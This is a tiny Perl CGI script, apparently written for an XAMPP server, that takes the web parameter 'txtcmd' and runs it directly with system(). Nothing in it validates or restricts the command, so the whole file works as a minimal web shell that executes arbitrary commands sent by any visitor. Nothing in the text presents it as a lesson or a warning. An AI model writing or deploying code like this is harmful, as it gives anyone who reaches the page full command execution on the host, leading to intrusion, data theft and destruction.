#!C:\xampp\perl\bin\perl.exe 
use CGI ':standard';

print  "Content-type: text/html \n\n";
print  "The output of UNIX command is as";

$c=param('txtcmd');

print(system($c));

